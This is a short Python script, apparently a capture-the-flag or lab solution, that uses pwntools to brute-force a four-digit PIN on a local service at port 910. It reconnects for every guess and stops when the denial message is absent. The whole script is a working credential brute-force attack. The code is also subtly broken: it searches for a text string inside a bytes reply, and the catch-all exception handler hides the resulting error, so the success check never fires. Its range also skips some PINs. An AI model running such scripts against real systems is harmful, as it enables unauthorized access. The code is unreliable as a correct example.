#!/usr/bin/python3

from pwn import *
import sys

MIN = 1
MAX = 9999


# input: int number
# output: string 4-digit number
def fix_size(num: int):
    return (((4 - len(str(num))) * '0') + str(num)).encode("utf-8")


def main():
    for pin in range(MIN, MAX, 1):
        conn = remote("127.0.0.1", 910)
        try:
            conn.recvuntil("[$]", timeout=30)
            print(f"Sending {pin}")
            conn.sendline(fix_size(pin))

            out = conn.recvline(timeout=10)
            print(out)
            if not "[!] Access denied, disconnecting client" in out:
                sys.exit(0)
            else:
                conn.close()
                continue
        except Exception as e:
            continue

main()
